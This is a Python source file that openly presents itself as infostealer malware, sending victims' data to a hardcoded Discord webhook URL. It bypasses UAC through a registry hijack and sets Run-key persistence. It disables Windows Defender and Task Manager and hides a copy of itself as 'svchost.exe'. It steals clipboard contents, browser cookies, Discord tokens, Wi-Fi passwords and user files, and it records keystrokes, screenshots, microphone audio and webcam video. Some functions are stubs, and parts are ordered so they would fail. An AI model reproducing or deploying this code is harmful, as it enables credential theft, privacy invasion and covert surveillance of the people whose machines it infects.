# making a infostealer malware that steals everything from the victim's computer using discord webhook
import os
import shutil
import requests
import getpass
import platform
import socket
import subprocess
import tempfile
from pathlib import Path
import zipfile
import winreg
import ctypes
import sys
import time
import threading
import json
import base64
import re
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import sqlite3
import win32crypt
import psutil
import win32api
import win32con
import win32event
import win32file
import win32security
import win32com.client
import win32profile
import win32timezone
import win32wnet
import win32netcon
import win32evtlog
import win32evtlogutil
import win32process
import win32service
import win32serviceutil
import win32ts
import win32ui
import win32clipboard
import win32pdh
import win32pdhutil
import win32traceutil
import win32job
import win32net
import win32netcon
import win32pipe
import keyboard
import mouse
import psutil
import pyautogui
import pyperclip
import mss
import mss.tools
import sounddevice as sd
import wmi
import pyaudio
import wave
import cv2
import numpy as np
import yagmail
import schedule
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from discord_webhook import DiscordWebhook, DiscordEmbed
import browser_cookie3
import requests
import urllib3
import certifi
import ssl
import logging
import traceback
import inspect
import re
import ast
import difflib
import filecmp
import zipfile
import tempfile
import shutil


WEBHOOK = "https://discord.com/api/webhooks/1463319100238463080/TKw2B3txYaoIKY8_PvWviMRdgozs1bDJMf4kBTgdgdnYwT0mNPxcXXRXcOLuXJrNe1iK"

def bypass_uac():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Classes\ms-settings\shell\open\command",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(
            key,
            "",
            0,
            winreg.REG_SZ,
            f'"{sys.executable}" "{os.path.abspath(__file__)}"',
        )
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        ctypes.windll.shell32.ShellExecuteW(
            None, "open", "fodhelper.exe", None, None, 1
        )
        time.sleep(5)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Classes\ms-settings\shell\open\command",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.DeleteValue(key, "")
        winreg.DeleteValue(key, "DelegateExecute")
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to bypass UAC: {e}")
bypass_uac()

def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        return False
    def startup_check():
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS,
            )
            winreg.SetValueEx(
                key,
                "MyMalware",
                0,
                winreg.REG_SZ,
                f'"{sys.executable}" "{os.path.abspath(__file__)}"',
            )
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Failed to set startup registry key: {e}")
    startup_check()
run_as_admin()

def console_hide():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        print(f"Failed to hide console: {e}")
console_hide()

def steal_clipboard():
    try:
        clipboard_data = pyperclip.paste()
        temp_file = os.path.join(tempfile.gettempdir(), "clipboard.txt")
        with open(temp_file, "w") as f:
            f.write(clipboard_data)
        send_webhook(temp_file, "Stolen Clipboard Data")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal clipboard data: {e}")
steal_clipboard()


def bypass_antivirus():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Policies\Microsoft\Windows Defender",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(
            key,
            "DisableAntiSpyware",
            0,
            winreg.REG_DWORD,
            1,
        )
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to bypass antivirus: {e}")
bypass_antivirus()

def block_task_manager():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
            0,
            winreg.KEY_ALL_ACCESS,
        )
        winreg.SetValueEx(
            key,
            "DisableTaskMgr",
            0,
            winreg.REG_DWORD,
            1,
        )
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to block Task Manager: {e}")
block_task_manager()

def steal_info():
    try:
        user_profile = os.getenv("USERPROFILE")
        documents_path = os.path.join(user_profile, "Documents")
        desktop_path = os.path.join(user_profile, "Desktop")
        downloads_path = os.path.join(user_profile, "Downloads")
        paths_to_steal = [documents_path, desktop_path, downloads_path]
        temp_zip = os.path.join(tempfile.gettempdir(), "stolen_data.zip")
        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
            for path in paths_to_steal:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, user_profile)
                            zipf.write(file_path, arcname)
        send_webhook(temp_zip, "Stolen User Data")
        os.remove(temp_zip)
    except Exception as e:
        print(f"Failed to steal user info: {e}")
steal_info()

def steal_installed_programs():
    try:
        installed_programs = []
        uninstall_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, uninstall_key) as key:
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                with winreg.OpenKey(key, subkey_name) as subkey:
                    try:
                        display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                        installed_programs.append(display_name)
                    except FileNotFoundError:
                        continue
        temp_file = os.path.join(tempfile.gettempdir(), "installed_programs.txt")
        with open(temp_file, "w") as f:
            for program in installed_programs:
                f.write(program + "\n")
        send_webhook(temp_file, "Stolen Installed Programs")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal installed programs: {e}")
steal_installed_programs()

def steal_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            processes.append(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
        temp_file = os.path.join(tempfile.gettempdir(), "running_processes.txt")
        with open(temp_file, "w") as f:
            for process in processes:
                f.write(process + "\n")
        send_webhook(temp_file, "Stolen Running Processes")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal running processes: {e}")
steal_processes()

def remote_desktop_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        temp_file = os.path.join(tempfile.gettempdir(), "screenshot.png")
        screenshot.save(temp_file)
        send_webhook(temp_file, "Remote Desktop Screenshot")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to take remote desktop screenshot: {e}")
remote_desktop_screenshot()

def control_panel_history():
    try:
        history_path = os.path.join(
            os.getenv("APPDATA"),
            "Microsoft",
            "Windows",
            "Recent",
        )
        recent_files = os.listdir(history_path)
        temp_file = os.path.join(tempfile.gettempdir(), "control_panel_history.txt")
        with open(temp_file, "w") as f:
            for file in recent_files:
                f.write(file + "\n")
        send_webhook(temp_file, "Stolen Control Panel History")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal control panel history: {e}")
control_panel_history()

def steal_mail_data():
    try:
        temp_file = os.path.join(tempfile.gettempdir(), "mail_data.txt")
        with open(temp_file, "w") as f:
            f.write("Mail data extraction not implemented.")
        send_webhook(temp_file, "Stolen Mail Data")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal mail data: {e}")
steal_mail_data()

def steal_mac_addresses():
    try:
        mac_addresses = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac_addresses.append(f"{interface}: {addr.address}")
        temp_file = os.path.join(tempfile.gettempdir(), "mac_addresses.txt")
        with open(temp_file, "w") as f:
            for mac in mac_addresses:
                f.write(mac + "\n")
        send_webhook(temp_file, "Stolen MAC Addresses")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal MAC addresses: {e}")
steal_mac_addresses()

def command_prompt_history():
    try:
        history = subprocess.check_output("doskey /history", shell=True).decode()
        temp_file = os.path.join(tempfile.gettempdir(), "cmd_history.txt")
        with open(temp_file, "w") as f:
            f.write(history)
        send_webhook(temp_file, "Stolen Command Prompt History")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal command prompt history: {e}")
command_prompt_history()

def password_manager_data():
    try:
        temp_file = os.path.join(tempfile.gettempdir(), "password_manager_data.txt")
        with open(temp_file, "w") as f:
            f.write("Password manager data extraction not implemented.")
        send_webhook(temp_file, "Stolen Password Manager Data")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal password manager data: {e}")
password_manager_data()

def password_grabber():
    try:
        temp_file = os.path.join(tempfile.gettempdir(), "passwords.txt")
        with open(temp_file, "w") as f:
            f.write("Password grabbing not implemented.")
        send_webhook(temp_file, "Stolen Passwords")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to grab passwords: {e}")
password_grabber()

def get_temp_dir():
    return tempfile.gettempdir()

def get_appdata_dir():
    return os.getenv("APPDATA")

def get_localappdata_dir():
    return os.getenv("LOCALAPPDATA")



def exe_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.abspath(__file__)
CURRENT_EXE_PATH = exe_path()

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("discord_webhook").setLevel(logging.CRITICAL)
ssl._create_default_https_context = ssl._create_unverified_context
session = requests.Session()
session.verify = False
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'})
def send_webhook(file_path, description="Stolen Data"):
    try:
        webhook = DiscordWebhook(url=WEBHOOK, content=description)
        with open(file_path, "rb") as f:
            webhook.add_file(file=f.read(), filename=os.path.basename(file_path))
        response = webhook.execute()
        return response
    except Exception as e:
        print(f"Failed to send webhook: {e}")
        return None
def steal_browser_data():
    try:
        data = {}
        browsers = {
            "chrome": browser_cookie3.chrome,
            "firefox": browser_cookie3.firefox,
            "edge": browser_cookie3.edge,
            "opera": browser_cookie3.opera,
        }
        for name, func in browsers.items():
            try:
                cookies = func()
                data[name] = [{"name": c.name, "value": c.value, "domain": c.domain} for c in cookies]
            except Exception as e:
                data[name] = f"Failed to retrieve cookies: {e}"
        temp_file = os.path.join(tempfile.gettempdir(), "browser_data.json")
        with open(temp_file, "w") as f:
            json.dump(data, f, indent=4)
        send_webhook(temp_file, "Stolen Browser Data")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal browser data: {e}")
steal_browser_data()

def steal_discord_tokens():
    try:
        tokens = []
        paths = {
            "Discord": os.path.join(os.getenv("APPDATA"), "Discord"),
            "Discord Canary": os.path.join(os.getenv("APPDATA"), "discordcanary"),
            "Discord PTB": os.path.join(os.getenv("APPDATA"), "discordptb"),
            "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
            "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
        }
        token_pattern = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
        for name, path in paths.items():
            local_storage = os.path.join(path, "Local Storage", "leveldb")
            if os.path.exists(local_storage):
                for file_name in os.listdir(local_storage):
                    if file_name.endswith(".log") or file_name.endswith(".ldb"):
                        try:
                            with open(os.path.join(local_storage, file_name), errors="ignore") as f:
                                content = f.read()
                                matches = token_pattern.findall(content)
                                for token in matches:
                                    tokens.append({"source": name, "token": token})
                        except Exception as e:
                            continue
        temp_file = os.path.join(tempfile.gettempdir(), "discord_tokens.json")
        with open(temp_file, "w") as f:
            json.dump(tokens, f, indent=4)
        send_webhook(temp_file, "Stolen Discord Tokens")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal Discord tokens: {e}")
steal_discord_tokens()

def steal_wifi_passwords():
    try:
        wifi_data = []
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", output)
        for profile in profiles:
            profile = profile.strip()
            try:
                profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode()
                password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                password = password_match.group(1).strip() if password_match else "N/A"
                wifi_data.append({"SSID": profile, "Password": password})
            except Exception as e:
                wifi_data.append({"SSID": profile, "Password": f"Failed to retrieve: {e}"})
        temp_file = os.path.join(tempfile.gettempdir(), "wifi_passwords.json")
        with open(temp_file, "w") as f:
            json.dump(wifi_data, f, indent=4)
        send_webhook(temp_file, "Stolen WiFi Passwords")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to steal WiFi passwords: {e}")
steal_wifi_passwords()

def collect_system_info():
    try:
        info = {
            "username": getpass.getuser(),
            "hostname": socket.gethostname(),
            "ip_address": socket.gethostbyname(socket.gethostname()),
            "platform": platform.platform(),
            "processor": platform.processor(),
            "ram": str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
        }
        temp_file = os.path.join(tempfile.gettempdir(), "system_info.json")
        with open(temp_file, "w") as f:
            json.dump(info, f, indent=4)
        send_webhook(temp_file, "System Information")
        os.remove(temp_file)
    except Exception as e:
        print(f"Failed to collect system info: {e}")
collect_system_info()


class Keylogger:
    def __init__(self):
        self.log = ""
        keyboard.on_release(self.on_key_release)

    def on_key_release(self, event):
        self.log += event.name + " "

    def start(self):
        keyboard.wait()

    def save_log(self):
        temp_file = os.path.join(tempfile.gettempdir(), "keylog.txt")
        with open(temp_file, "w") as f:
            f.write(self.log)
        send_webhook(temp_file, "Stolen Keylogger Data")
        os.remove(temp_file)
keylogger = Keylogger()
keylogger_thread = threading.Thread(target=keylogger.start)
keylogger_thread.start()
time.sleep(60)  # Log for 60 seconds
keylogger.save_log()

# makeing this undetectable
def make_undetectable():
    try:
        temp_dir = get_temp_dir()
        hidden_exe_path = os.path.join(temp_dir, "svchost.exe")
        shutil.copy2(CURRENT_EXE_PATH, hidden_exe_path)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_exe_path, win32con.FILE_ATTRIBUTE_HIDDEN)
    except Exception as e:
        print(f"Failed to make undetectable: {e}")
make_undetectable()
def steal_system32_files():
    try:
        system32_path = os.path.join(os.getenv("WINDIR"), "System32")
        temp_zip = os.path.join(tempfile.gettempdir(), "system32_files.zip")
        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(system32_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, system32_path)
                    zipf.write(file_path, arcname)
        send_webhook(temp_zip, "Stolen System32 Files")
        os.remove(temp_zip)
    except Exception as e:
        print(f"Failed to steal System32 files: {e}")
steal_system32_files()
def steal_system_drive_files():
    try:
        system_drive = os.getenv("SystemDrive") + "\\"
        temp_zip = os.path.join(tempfile.gettempdir(), "system_drive_files.zip")
        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(system_drive):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, system_drive)
                    zipf.write(file_path, arcname)
        send_webhook(temp_zip, "Stolen System Drive Files")
        os.remove(temp_zip)
    except Exception as e:
        print(f"Failed to steal System Drive files: {e}")
steal_system_drive_files()

def steal_program_files():
    try:
        program_files = [os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)")]
        temp_zip = os.path.join(tempfile.gettempdir(), "program_files.zip")
        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
            for path in program_files:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, path)
                            zipf.write(file_path, arcname)
        send_webhook(temp_zip, "Stolen Program Files")
        os.remove(temp_zip)
    except Exception as e:
        print(f"Failed to steal Program Files: {e}")
steal_program_files()

class AudioRecorder:
    def __init__(self, duration=10, filename="audio_recording.wav"):
        self.duration = duration
        self.filename = os.path.join(tempfile.gettempdir(), filename)
        self.fs = 44100  # Sample rate

    def record(self):
        print("Recording audio...")
        recording = sd.rec(int(self.duration * self.fs), samplerate=self.fs, channels=2)
        sd.wait()  # Wait until recording is finished
        wave.write(self.filename, self.fs, recording)
        print("Recording complete.")

    def send_recording(self):
        send_webhook(self.filename, "Stolen Audio Recording")
        os.remove(self.filename)
audio_recorder = AudioRecorder(duration=15)
audio_recorder.record()
audio_recorder.send_recording()

class remote_access:
    def __init__(self):
        self.screenshot_file = os.path.join(tempfile.gettempdir(), "remote_screenshot.png")

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(self.screenshot_file)

    def send_screenshot(self):
        send_webhook(self.screenshot_file, "Remote Access Screenshot")
        os.remove(self.screenshot_file)
remote_access_instance = remote_access()
remote_access_instance.take_screenshot()
remote_access_instance.send_screenshot()

class live_video_capture:
    def __init__(self, duration=10, filename="live_video.avi"):
        self.duration = duration
        self.filename = os.path.join(tempfile.gettempdir(), filename)
        self.fs = 20.0  # Frame rate
        self.resolution = (640, 480)

    def record(self):
        cap = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(self.filename, fourcc, self.fs, self.resolution)
        start_time = time.time()
        while int(time.time() - start_time) < self.duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        cap.release()
        out.release()

    def send_video(self):
        send_webhook(self.filename, "Live Video Capture")
        os.remove(self.filename)
live_video = live_video_capture(duration=15)
live_video.record()